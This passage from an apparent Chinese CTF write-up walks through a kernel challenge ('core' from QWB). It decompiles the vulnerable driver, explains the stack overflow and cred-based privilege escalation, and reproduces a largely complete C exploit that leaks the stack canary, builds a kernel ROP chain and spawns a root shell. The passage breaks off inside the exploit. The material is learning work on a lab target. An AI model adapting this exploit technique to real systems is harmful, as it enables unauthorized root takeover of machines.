<li>/proc/kallsyms 其实是内核符号表，拥有内核符号的地址</li>
</ul>
<p>重新打包后，我们着重分析一下 core.ko 驱动文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  core checksec core.ko </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>64位，dynamically，开了carnay，开了NX</p>
<img src="/2022/05/12/my%20first%20kernel%20pwn/1652266257344.png" class width="1652266257344"> 
<p>这些函数就是驱动函数，也被称为 ioctl 函数：</p>
<ul>
<li>ioctl 是设备驱动程序中对设备的 I/O 通道进行管理的函数</li>
<li>ioctl 函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对 ioctl 的支持，用户就可以在用户程序中使用 ioctl 函数控制设备的 I/O 通道</li>
<li>在驱动程序中实现的 ioctl 函数体内，实际上是有一个 switch{case} 结构，每一个 case 对应一个命令码，做出一些相应的操作，怎么实现这些操作，这是由每一个程序员自己控制的，因为设备都是特定的</li>
</ul>
<p>驱动函数是 kernel 中容易出问题的点，接下来就看看这些函数：</p>
<ul>
<li>init_module：注册了 <code>/proc/core</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;16core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>exit_core：删除 <code>/proc/core</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">exit_core</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_ioctl：定义了三条命令，分别调用 core_read()，core_copy_func() 和设置全局变量 off </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> choice, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>: <span class="comment">// 0x6677889B</span></span><br><span class="line">      core_read((<span class="keyword">char</span> *)a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>: <span class="comment">// 0x6677889C</span></span><br><span class="line">      printk(<span class="string">&quot;16core: %d\n&quot;</span>, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>: <span class="comment">// 0x6677889A</span></span><br><span class="line">      printk(<span class="string">&quot;16core: called core_copy\n&quot;</span>);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_read：从内核空间 from[off] 拷贝 64 字节到用户空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_read</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *p; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> from[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;16core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;16%d %p\n&quot;</span>, off, a1);</span><br><span class="line">  p = from;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )                      <span class="comment">// 置空64(16*4)位</span></span><br><span class="line">    *p++ = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(from, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(a1, &amp;from[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;                            <span class="comment">// 调用swapgs命令,在gs寄存器的内核与用户态值之间切换，为离开内核做准备</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_write：向全局变量 <code>name</code> 上写</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 from, <span class="keyword">unsigned</span> __int64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(&amp;str1);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">0x800</span> || copy_from_user(&amp;name, from, len) )</span><br><span class="line">    printk(&amp;str2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>core_copy_func：从全局变量 <code>name</code> 中拷贝数据到局部变量中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_copy_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v1[<span class="number">64</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;16core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;16Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);   <span class="comment">// 漏洞点:因数组溢出导致的栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是我的第一个内核题，我全程都是按照 wiki 上的提示做的，所以我会尽可能的复述解题的过程和思路，有些必要的知识也会进行补充</p>
<p>当我们打开这个 kernel 时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ whoami</span><br><span class="line">chal</span><br></pre></td></tr></table></figure>
<p>我们是普通用户权限，需要提权拿“flag”，这里先介绍一下权限和提权：</p>
<ul>
<li>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限</li>
<li>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源，这里从两种角度来考虑如何提权<ul>
<li>改变自身（Change Self）：通过改变自身进程的权限，使其具有 root 权限<ul>
<li>直接修改 cred 结构体的内容（需要先定位 cred，然后将其修改）</li>
<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li>
</ul>
</li>
<li>改变别人（Change Others）：通过影响高权限进程的执行，使其完成我们想要的功能<ul>
<li>改数据</li>
<li>改代码</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>具体的过程就不展开了</p>
<ul>
<li>在本题目的环境中，因为程序有栈溢出漏洞可以控制程序执行流，所以可以通过 ROP 来调用 commit_creds(prepare_kernel_cred(0)) 进行提取</li>
<li>该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred</li>
<li>另外，该方式属于“改变自身”中的“修改 task_struct 结构体”</li>
</ul>
<p>为了调用 prepare_kernel_cred 首先需要实现 ROP：</p>
<ul>
<li>通过 ioctl 设置 off，然后通过 core_read() leak 出 canary</li>
<li>通过 core_write() 向 name 写，构造 ropchain</li>
<li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li>
<li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
<li>返回用户态，通过 system(“/bin/sh”) 等起 shell</li>
</ul>
<p>这又有一个问题，如何在 shell 中使用这些驱动函数呢？在C语言中有专门的接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(fd, function_num, var);</span><br></pre></td></tr></table></figure>
<p>使用这个函数的前提是知道 function_num（可以直接在 core_ioctl 的 Switch-Case 中找到它）</p>
<p>接下来介绍利用GDB调试的方法：</p>
<ul>
<li>使用 <code>gdb ./vmlinux</code> 可以进行调试</li>
<li>虽然加载了 kernel 的符号表，但没有加载驱动 <code>core.ko</code> 的符号表，可以通过 <code>add-symbol-file core.ko textaddr</code> 加载 </li>
<li>.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 <code>init</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># setsid /bin/cttyhack setuidgid 1000 /bin/sh</span></span><br><span class="line">setsid /bin/cttyhack setuidgid <span class="number">0</span> /bin/sh</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffc0257000</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="meta"># cat /sys/module/core/sections/.text </span></span><br><span class="line"><span class="number">0xffffffffc0257000</span></span><br></pre></td></tr></table></figure>
<p>接下来进行调试：</p>
<ul>
<li>先使用 start.sh 打开 kernel</li>
<li>然后打开 GDB</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  core gdb ./vmlinux   </span><br><span class="line">pwndbg: loaded <span class="number">198</span> commands. Type pwndbg [filter] <span class="keyword">for</span> a <span class="built_in">list</span>.</span><br><span class="line">pwndbg: created $rebase, $<span class="function">ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from ./vmlinux...</span></span><br><span class="line"><span class="function"><span class="params">(No debugging symbols found in ./vmlinux)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 add-symbol-file 加载符号，然后就可以利用符号进行断点了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file core.ko <span class="number">0xffffffffc0257000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;core.ko&quot;</span> at</span><br><span class="line">	.text_addr = <span class="number">0xffffffffc0257000</span></span><br><span class="line">Reading symbols from core.ko...</span><br><span class="line">(No debugging symbols found in core.ko)</span><br><span class="line">pwndbg&gt; b core_read  </span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0xffffffffc0257063</span></span><br></pre></td></tr></table></figure>
<ul>
<li>尝试用 GDB 连接 kernel</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:<span class="number">1234</span></span><br><span class="line">Remote debugging <span class="keyword">using</span> localhost:<span class="number">1234</span></span><br><span class="line"><span class="number">0xffffffff9586e7d2</span> in ?? ()</span><br></pre></td></tr></table></figure>
<p>最后就来学习学习官方的exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-- 直接ROP --&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span> <span class="comment">/* 后门函数 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>; <span class="comment">/* 后续说明基地址的计算 */</span></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span> <span class="comment">/* 收集必要信息 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* 根据前面的分析,这里读取/tmp/kallsyms相当于读取/proc/kallsyms(内核符号表) */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred) <span class="comment">/* 如果都已经读入过了,直接返回 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;	</span><br><span class="line">            <span class="comment">/* 读取commit_creds的地址(更新当前进程的cred),计算vmlinux_base */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>; <span class="comment">/* 后续说明该偏移的计算 */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 读取prepare_kernel_cred的地址(构造一个新的cred),计算vmlinux_base */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>; <span class="comment">/* 后续说明该偏移的计算 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> <span class="comment">/* 保存当前寄存器的状态 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span> <span class="comment">/* 设置off */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span> <span class="comment">/* core_read的外包装 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span> <span class="comment">/* core_copy_func的外包装 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols(); <span class="comment">/* 获取相关信息 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>); <span class="comment">/* 设置全局变量off为&#x27;0x40&#x27;(为了泄露carnay) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf); <span class="comment">/* 从from[off](内核空间)拷贝64个字节到buf(用户空间) */</span></span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>]; <span class="comment">/* 因为偏移off是0x40,所以直接泄露了canary */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">/* 初始化ROP链 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">/* 构造ROP链 */</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary; </span><br><span class="line">        <span class="comment">// rop[0-7]:共64字节(8*8),用于填充内核局部变量</span></span><br><span class="line">        <span class="comment">// rop[8]:canary应该在的位置</span></span><br><span class="line">        <span class="comment">// rop[9]:rbp的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    <span class="comment">/* swapgs:交换GS基址寄存器(准备回到用户态) */</span></span><br><span class="line">    <span 